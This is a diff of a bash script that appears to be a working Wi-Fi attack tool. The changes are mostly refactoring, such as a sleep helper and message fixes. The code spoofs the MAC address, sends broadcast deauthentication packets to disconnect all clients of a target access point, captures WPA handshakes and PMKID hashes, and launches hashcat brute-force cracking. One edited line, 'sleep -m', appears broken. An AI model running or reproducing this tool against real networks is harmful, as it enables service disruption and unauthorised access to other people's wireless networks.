@@ -7,11 +7,11 @@ trap ctrl_c INT
 
 function enable_managed_mode() {
 	echo -e "\n${doing}[~]${nc} Taking network card to managed mode..."
-	sleep 0.5
+	user_sleep
 	airmon-ng stop ${network_card} &>/dev/null
 	echo -e "${good}[+]${nc} Network card is now in managed mode."
 	echo -e "\n${doing}[~]${nc} Restarting network manager..."
-	sleep 0.5
+	user_sleep
 	service network-manager restart &>/dev/null
 	service NetworkManager restart &>/dev/null
 	service wpa_supplicant restart &>/dev/null
@@ -20,12 +20,12 @@ function enable_managed_mode() {
 
 function anonymize_mac_address() {
 	echo -e "\n${doing}[~]${nc} Anonymizing MAC address"
-	sleep 0.5
+	user_sleep
 	ifconfig ${network_card} down && macchanger -a ${network_card} &>/dev/null
 	ifconfig ${network_card} up &>/dev/null
 	macaddress=$(macchanger -s ${network_card} | grep -i "Current" | xargs | cut -d ' ' -f '3-100')
 	echo -e "\n${good}[+]${nc} New MAC address: $macaddress"
-	sleep 0.5
+	user_sleep
 }
 
 function enable_monitor_mode() {
@@ -37,14 +37,14 @@ function enable_monitor_mode() {
 	fi
 
 	echo -e "\n${good}[+]${nc} Network card in monitor mode"
-	sleep 0.5
+	user_sleep
 	anonymize_mac_address
 	echo -e "\n${doing}[~]${nc} Killing processes that could interfer"
-	sleep 0.5
+	user_sleep
 	killall wpa_supplicant dhclient 2>/dev/null
 	airmon-ng check kill &>/dev/null
 	echo -e "\n${good}[+]${nc} Processes killed correctly"
-	sleep 0.5
+	user_sleep
 }
 
 function kill_remaining_processes() {
@@ -101,22 +101,29 @@ function help_panel() {
 	exit_script
 }
 
+function do_not_close_sign() {
+	gum style "Do not close the new terminal, the script will close it automagically later"
+}
+
+function user_sleep() {
+	# This function is to set the user read sleep, to not spam the screen with a lot of messages very fast
+	sleep 0.5
+}
+
 function select_target_network() {
 	echo -e "\n${yellow}[*]${nc} Now we are going to scan the networks around you..."
 	echo -e "${yellow}[*]${nc} A new terminal will be opened to show you the networks around you"
-	sleep 1
 
 	airodump_file="airodump-dump"
 
 	xterm -hold -e "airodump-ng ${network_card} -w ${airodump_file} --write-interval 1 --output-format csv" &
 	airodump_xterm_pid=$!
 
-	echo -e "\n${yellow}[*]${nc} Do not close the new terminal, the script will close it when you press ${good}enter${nc}"
+	do_not_close_sign
 	echo -e "${yellow}[*]${nc} Wait a few seconds and pause the scan with ${good}enter${nc}..."
 	wait_for_confirmation
 	kill -9 $airodump_xterm_pid
 	wait $airodump_xterm_pid &>/dev/null
-	sleep 2
 
 	sed -i '1,2d' ${airodump_file}-01.csv
 	sed -i '1,/Station MAC/!d' ${airodump_file}-01.csv
@@ -160,31 +167,32 @@ function select_target_network() {
 
 function handshake() {
 	echo -e "\n${doing}[~]${nc} Listening network traffic of ${ap_bssid} on channel ${ap_channel}"
-	sleep 0.5
+	user_sleep
 	echo -e "\n${yellow}[*]${nc} A new terminal will be opened to show you the traffic of the network"
-	sleep 0.5
-	echo -e "\n${yellow}[*]${nc} Do not close the new terminal, the script will close it"
-	sleep 0.5
+	user_sleep
+	do_not_close_sign
+	user_sleep
 	xterm -hold -e "airodump-ng -c $ap_channel -w "capture_${ap_bssid}" --bssid "${ap_bssid}" ${network_card}" &
 	airodump_filter_xterm_pid=$!
 
 	echo -e "\n${yellow}[*]${nc} A new terminal will be opened to send the deauth packets"
-	sleep 0.5
-	echo -e "\n${yellow}[*]${nc} Do not close the new terminal, the script will close it"
-	sleep 5
+	user_sleep
+	do_not_close_sign
+	user_sleep
 	echo -e "\n${doing}[~]${nc} Deauthenticating all clients..."
-	sleep 0.5
+	user_sleep
 	xterm -hold -e "aireplay-ng -0 5 -a ${ap_bssid} -c ff:ff:ff:ff:ff:ff ${network_card}" &
 	aireplay_xterm_pid=$!
 
-	sleep 10
+	sleep 10 # Waiting deauthentication
 	kill -9 $aireplay_xterm_pid
 	wait $aireplay_xterm_pid &>/dev/null
 	echo -e "\n${green}[+]${nc} Signal for deauthenticate all clients sended"
 
-	echo -e "\n${doing}[~]${nc} Waiting handshake for 60 seconds..."
+	handshake_wait=60
+	echo -e "\n${doing}[~]${nc} Waiting handshake for ${handshake_wait} seconds..."
 
-	sleep 60 # Listen for 60 seconds
+	sleep ${handshake_wait}
 
 	tshark -r capture_${ap_bssid}-01.cap -Y "eapol" 1>handshake.txt 2>/dev/null
 
@@ -239,12 +247,11 @@ function handshake() {
 
 function pmkid() {
 	echo -ne "\n${ask}[?]${nc} How many minutes do you want to listen? [Recommended: 1]: " && read minutes
-	minutes=$(($minutes * 60))
 	echo -e "\n${doing}[~]${nc} Start listening at $(date +%H:%M:%S)..."
 	xterm -hold -e "hcxdumptool -i ${network_card} --enable_status=1 -o capture_pmkid" &
 	hcxdumptool_xterm_pid=$!
 	hcxdumptool_hang_process=$(ps aux | grep "hcxdumptool -i ${network_card} --enable_status=1 -o capture_pmkid" | grep -v "xterm" | awk '{print $2}')
-	sleep $minutes
+	sleep -m "$minutes"
 	echo -e "\n${doing}[~]${nc} Stop listening at $(date +%H:%M:%S)..."
 	kill -9 $hcxdumptool_xterm_pid &>/dev/null
 	wait $hcxdumptool_xterm_pid &>/dev/null
@@ -257,15 +264,15 @@ function pmkid() {
 	rm -rf capture_pmkid &>/dev/null
 	mkdir -p hashes_pmkid
 	mv hashes_pmkid* hashes_pmkid &>/dev/null
-	sleep 1
+	user_sleep
 
-	test -f hashes_pmkid/${hash_name}
+	test -f "hashes_pmkid/${hash_name}"
 
 	if [ "$(echo $?)" == "0" ]; then
 		echo -e "\n${good}[+]${nc} Hashes obtained"
-		sleep 1
+		user_sleep
 		echo -e "\n${doing}[~]${nc} Initiating brute-force attack..."
-		sleep 1
+		user_sleep
 		echo -e "\n${yellow}[*]${nc} A new terminal will be opened to show the progress of the attack"
 		xterm -hold -e "hashcat -m 22000 -a 0 hashes_pmkid/${hash_name} $wordlist_path" &
 		hashcat_xterm_pid=$!
@@ -279,7 +286,7 @@ function pmkid() {
 
 		if [ "${option,,}" == "yes" ] || [ "${option,,}" == "y" ]; then
 			echo -e "\n${doing}[~]${nc} Retrying...\n"
-			sleep 1
+			user_sleep
 			pmkid
 		fi
 	fi
@@ -314,7 +321,7 @@ function choose_card() {
 		else
 			echo -e "\n${good}[+]${nc} You choose ${network_card}\n"
 			break
-			sleep 1
+			user_sleep
 		fi
 	done
 	we_attack=0
@@ -338,7 +345,7 @@ while getopts ":a:n:hd" arg; do
 	d) see_all_dependencies ;;
 	h) help_panel ;;
 	?)
-		echo -e "${wrong}[!]${nc}Invalid option: -$OPTARG\n"
+		echo -e "${wrong}[!]${nc} Invalid option: -$OPTARG\n"
 		help_panel
 		;;
 	esac
@@ -357,7 +364,7 @@ if [ "$(id -u)" == "0" ]; then
 	fi
 
 	if [ -z "$attack_mode" ]; then
-		echo -e "${wrong}[!]${nc}Missing arguments!\n"
+		echo -e "${wrong}[!]${nc} Missing arguments!\n"
 		help_panel
 	fi
 
@@ -366,6 +373,6 @@ if [ "$(id -u)" == "0" ]; then
 
 	exit_script
 else
-	echo -e "${wrong}[!]${nc}You must be root to run this script"
+	echo -e "${wrong}[!]${nc} You must be root to run this script"
 	exit_script
 fi
